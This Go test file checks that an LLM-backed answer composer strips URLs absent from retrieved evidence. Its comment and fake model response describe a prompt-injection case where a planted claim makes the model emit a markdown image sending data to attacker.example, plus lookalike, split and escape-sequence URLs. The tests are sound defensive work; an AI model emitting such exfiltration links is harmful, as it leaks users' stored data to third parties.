package compose

import (
	"context"
	"strings"
	"testing"

	"github.com/sirerun/serenity/internal/config"
	"github.com/sirerun/serenity/internal/domain"
	"github.com/sirerun/serenity/internal/router"
	"github.com/sirerun/serenity/internal/store"
)

// TestAskDropsURLsAbsentFromEvidence is deep review 001's AI-05 case: a
// planted claim steers the composer into emitting a markdown image whose
// URL carries co-resident claims to an attacker host. Only a URL that is
// byte-equal to one in the retrieved evidence may reach the caller; every
// other URL becomes [link removed], and citations are untouched.
func TestAskDropsURLsAbsentFromEvidence(t *testing.T) {
	root := t.TempDir()
	fact := loadAvaFact(t, "ava-belongs_to_project-01.yaml")
	const evidenceURL = "https://docs.example.org/lighthouse"
	claim := domain.Claim{
		ID:          "bp-lighthouse",
		SubjectSlug: avaSlug,
		Predicate:   fact.Predicate,
		Object:      evidenceURL,
		Confidence:  0.9,
		ValidFrom:   fact.ValidFrom,
		ValidTo:     fact.ValidTo,
		State:       domain.StateActive,
		Family:      fact.Predicate,
		SourceRef:   "ava#1",
		Provenance:  domain.Provenance{SourceSHA256: fixtureSourceSHA(t, root, "project", evidenceURL), ObservedAt: mustDate(t, "2024-02-01")},
	}
	writeAvaEntity(t, root, []domain.Claim{claim})

	fp := &fakeProvider{
		modelVersion: "fake-composer@v1",
		resp: router.Response{Text: "Ava's project page is " + evidenceURL + " [claim:bp-lighthouse]. " +
			"![status](https://attacker.example/pixel.png?q=ava-standardo+" + fact.Predicate + ") " +
			"See [details](" + evidenceURL + "-evil), www.attacker.example/www and //attacker.example/relative. " +
			"Split https:[claim:hallucinated]//attacker.example/tag and https:\x1b[0m//attacker.example/esc too."},
	}
	c := New(root, config.Default(), fakeSearchStore{}, nil, newTestRouter(fp), "fake-composer@v1")
	c.now = fixedNow(mustDate(t, "2024-03-01"))

	ans, err := c.Ask(context.Background(), "What project does Ava belong to?")
	if err != nil {
		t.Fatalf("Ask: %v", err)
	}
	if ans.Gap != "" {
		t.Fatalf("Gap = %q, want empty (a matching claim exists)", ans.Gap)
	}
	if strings.Contains(ans.Text, "attacker.example") {
		t.Fatalf("Text still carries a URL absent from evidence: %q", ans.Text)
	}
	if strings.Contains(ans.Text, "lighthouse-evil") {
		t.Fatalf("a URL that merely extends an evidence URL survived: %q", ans.Text)
	}
	if !strings.Contains(ans.Text, "![status]([link removed])") {
		t.Fatalf("markdown image URL was not replaced by [link removed]: %q", ans.Text)
	}
	if !strings.Contains(ans.Text, "Ava's project page is "+evidenceURL+" [claim:bp-lighthouse].") {
		t.Fatalf("evidence URL or citation was altered: %q", ans.Text)
	}
	if strings.ContainsRune(ans.Text, '\x1b') {
		t.Fatalf("Text still carries ESC: %q", ans.Text)
	}
	if len(ans.Citations) != 1 || ans.Citations[0].ClaimID != "bp-lighthouse" {
		t.Fatalf("Citations = %+v, want exactly bp-lighthouse", ans.Citations)
	}
}

// TestSanitizeTextKeepsSourceEvidenceURLs covers the attributed-source
// half of the evidence set: a URL a remembered fact carried survives, with
// sentence punctuation after it, while a lookalike on another host does
// not.
func TestSanitizeTextKeepsSourceEvidenceURLs(t *testing.T) {
	const runbook = "https://runbook.example.net/deploy?step=2"
	sources := []store.MemoryFactRecord{{
		SHA256:  "abc123",
		Payload: store.MemoryFactPayload{Fact: "The deploy runbook lives at " + runbook, Provenance: "ops notes"},
	}}
	in := "Follow " + runbook + ". [source:abc123] Mirror: https://runbook.example.net.attacker.example/deploy?step=2 [source:nope]"
	got := sanitizeText(in, nil, sources)
	want := "Follow " + runbook + ". [source:abc123] Mirror: [link removed] "
	if got != want {
		t.Fatalf("sanitizeText =\n%q\nwant\n%q", got, want)
	}
}
